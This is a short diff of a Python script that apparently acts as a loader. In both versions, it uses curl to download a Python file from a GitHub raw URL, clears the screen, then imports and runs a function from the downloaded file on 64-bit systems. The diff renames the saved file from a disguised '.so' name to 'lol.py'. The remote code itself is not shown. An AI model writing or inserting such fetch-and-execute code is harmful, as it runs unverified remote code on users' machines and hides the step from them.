@@ -7,9 +7,9 @@ except:
 
 import requests
 if not os.path.isfile('Jutt.so'):
-    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKAR/jutt/main/lol.py > Jutt.so')
+    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKAR/jutt/main/lol.py > lol.py')
     os.system('clear')
 bit=platform.architecture()[0]
 if bit == '64bit':
-    from Jutt import reg
+    from lol import reg
     reg()
